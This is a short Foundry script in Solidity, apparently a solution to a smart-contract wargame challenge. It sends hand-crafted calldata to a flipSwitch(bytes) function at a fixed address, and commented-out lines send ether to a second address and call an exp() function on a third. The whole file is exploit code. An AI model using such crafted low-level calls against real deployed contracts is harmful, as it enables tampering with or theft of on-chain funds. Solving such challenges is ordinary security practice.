pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract lol is Script {
    function run() external {
        vm.startBroadcast();
        bytes memory a;
        address(0x11ceD174c20e9fAbF75e5E2e951457E760cC066b).call(abi.encodeWithSignature("flipSwitch(bytes)", 0x20606e15, uint256(10)));
        // console.log(vm.toString(abi.encodeWithSignature("flipSwitch(bytes)", 0x20606e15, uint256(10))));
        // address(0x79a5399479Fe3F31Ca21AeB147F8036EE2aEe2De).call{value: 1000000000000000}("");
        // address(0xF056B28F1160085dE43eDb1bba5f0A36B44B0EfB).call(abi.encodeWithSignature("exp()"));
    }
}